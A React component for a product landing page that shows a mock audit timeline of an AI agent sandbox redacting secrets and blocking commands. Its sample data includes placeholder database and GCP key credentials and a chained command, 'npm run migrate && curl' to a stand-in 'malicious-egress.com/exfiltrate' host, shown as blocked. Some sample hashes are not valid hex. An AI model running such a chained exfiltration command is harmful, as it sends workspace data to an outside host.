"use client";

import React, { useState } from "react";
import { EyeOff, CheckCircle2, Database, Terminal } from "lucide-react";

interface AuditEvent {
  time: string;
  type: "tool_execution" | "dlp_redaction" | "ledger_anchor";
  title: string;
  desc: string;
  rawText?: string;
  redactedText?: string;
  hash: string;
  icon: React.ComponentType<any>;
}

export default function ZeroTrustLedgerSection() {
  const [hoveredIndex, setHoveredIndex] = useState<number | null>(null);

  const events: AuditEvent[] = [
    {
      time: "02:01:42.083",
      type: "tool_execution",
      title: "File Access Intercepted",
      desc: "Agent requested write access to database configuration module.",
      rawText:
        "DATABASE_URL=postgresql://admin:super_secret_password_2026@db.internal:5432/production",
      redactedText:
        "DATABASE_URL=postgresql://admin:[REDACTED_DATABASE_CREDENTIALS]@db.internal:5432/production",
      hash: "sha256:8f2a7b1c4e9d3f5a6b7c8d9e0f1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s",
      icon: Database,
    },
    {
      time: "02:01:42.191",
      type: "dlp_redaction",
      title: "GCP DLP Redaction Check",
      desc: "Scanned prompt payload for PII and API keys. Flagged Google Cloud Service Account credentials.",
      rawText:
        'client_email: "owner@inso-prod.iam.gserviceaccount.com", private_key: "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDhO..."',
      redactedText:
        'client_email: "owner@inso-prod.iam.gserviceaccount.com", private_key: "[REDACTED_GCP_PRIVATE_KEY]"',
      hash: "sha256:4c3d2e1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d",
      icon: EyeOff,
    },
    {
      time: "02:01:42.245",
      type: "tool_execution",
      title: "CLI Command Sanitized",
      desc: "Validated shell command before staging execution. Ensured no command chaining or remote download piping.",
      rawText:
        "npm run migrate && curl -s http://malicious-egress.com/exfiltrate",
      redactedText:
        "npm run migrate [COMMAND CHAINING BLOCKED: curl -s http://malicious-egress.com/exfiltrate]",
      hash: "sha256:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7g8h",
      icon: Terminal,
    },
    {
      time: "02:01:42.312",
      type: "ledger_anchor",
      title: "Cryptographic Block Anchored",
      desc: "Consolidated all execution metadata into a signed ledger block. Local state validated against workspace git hash.",
      hash: "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      icon: CheckCircle2,
    },
  ];

  return (
    <section className="w-full py-32 bg-gray-50 text-black px-4 sm:px-6 lg:px-8 border-t border-gray-100 overflow-hidden">
      <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 items-center gap-16 lg:gap-24">
        {/* Left Column: Copy */}
        <div className="lg:col-span-7 flex flex-col gap-8">
          <div className="flex flex-col gap-6">
            <h3 className="text-4xl lg:text-5xl font-bold tracking-tight leading-[1.1] text-black">
              Zero-Trust Audit Trail. <br />
              Cryptographic Ledger.
            </h3>
            <p className="text-xl text-gray-500 leading-relaxed font-medium">
              Every operation is confined to a secure sandbox, monitored, and
              recorded in a local SQLite audit database. Before context leaves
              your workspace, local DLP rules automatically strip secrets so
              credentials never touch foundational model APIs or external
              servers.
            </p>
          </div>
        </div>

        {/* Right Column: Ledger Timeline */}
        <div className="lg:col-span-5 w-full lg:w-[130%] lg:translate-x-8">
          <div className="bg-white border border-gray-200/80 rounded-[32px] shadow-xl p-6 md:p-8 flex flex-col gap-6 select-none relative lg:h-[460px] overflow-hidden justify-between">
            {/* Header */}
            <div className="flex items-center justify-between pb-4 border-b border-gray-100 shrink-0">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500" />
                <span className="text-xs font-bold text-gray-600 uppercase tracking-wider font-mono">
                  Tamper-Proof Audit Stream
                </span>
              </div>
              <span className="text-xs text-gray-400 font-mono font-medium">
                db_checksum: signed_local_ledger
              </span>
            </div>

            {/* Timeline Events Scroll/Crop Wrapper */}
            <div className="relative flex-1 overflow-hidden min-h-0 py-1">
              <div className="relative flex flex-col gap-8 pl-4">
                {/* Vertical connecting line */}
                <div className="absolute left-[29px] top-4 bottom-4 w-[2px] bg-gray-100" />

                {events.map((event, idx) => {
                  const IconComponent = event.icon;
                  const isHovered = hoveredIndex === idx;

                  return (
                    <div
                      key={idx}
                      className="relative flex gap-6 items-start group cursor-pointer transition-all duration-300"
                      onMouseEnter={() => setHoveredIndex(idx)}
                      onMouseLeave={() => setHoveredIndex(null)}
                    >
                      {/* Time Label on left */}
                      <div className="text-[10px] text-gray-400 font-mono font-bold pt-1.5 w-16 text-right shrink-0">
                        {event.time}
                      </div>

                      {/* Timeline Node Icon */}
                      <div
                        className={`relative z-10 w-9 h-9 rounded-xl border flex items-center justify-center shrink-0 transition-all duration-300 ${
                          isHovered
                            ? "bg-black border-black text-white shadow-md"
                            : "bg-white border-gray-200 text-gray-500 group-hover:border-gray-400"
                        }`}
                      >
                        <IconComponent className="w-4 h-4" />
                      </div>

                      {/* Content Box */}
                      <div className="flex-1 min-w-0 flex flex-col gap-1.5">
                        <div className="flex items-baseline justify-between gap-4">
                          <h4 className="text-sm font-bold text-black group-hover:text-neutral-900 transition-colors">
                            {event.title}
                          </h4>
                          <span className="text-[9px] text-gray-400 font-mono truncate max-w-[120px]">
                            {event.hash.substring(0, 16)}...
                          </span>
                        </div>
                        <p className="text-xs text-gray-500 font-medium leading-relaxed">
                          {event.desc}
                        </p>

                        {/* Expanded View for DLP details */}
                        {(event.rawText || event.redactedText) && (
                          <div
                            className={`mt-2 p-3.5 bg-gray-50 border border-gray-100 rounded-xl font-mono text-[9px] flex flex-col gap-2 overflow-hidden transition-all duration-300 ${
                              isHovered ? "border-gray-200 shadow-sm" : ""
                            }`}
                          >
                            {event.rawText && (
                              <div className="text-gray-400 line-through truncate">
                                <span className="text-[8px] font-bold text-red-500 bg-red-50 px-1 py-0.5 rounded mr-1.5 font-sans uppercase">
                                  Source
                                </span>
                                {event.rawText}
                              </div>
                            )}
                            {event.redactedText && (
                              <div className="text-emerald-600 font-bold truncate">
                                <span className="text-[8px] font-bold text-emerald-600 bg-emerald-50 px-1 py-0.5 rounded mr-1.5 font-sans uppercase">
                                  Redacted
                                </span>
                                {event.redactedText}
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Fade-out overlay for cropped look */}
              <div className="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-white to-transparent pointer-events-none z-20" />
            </div>

            {/* Footer */}
            <div className="border-t border-gray-100 pt-4 flex items-center justify-between text-[10px] text-gray-400 font-semibold font-mono shrink-0">
              <span>Ledger Security: SHA-256 HMAC-signed</span>
              <span>Audit logs synchronized</span>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
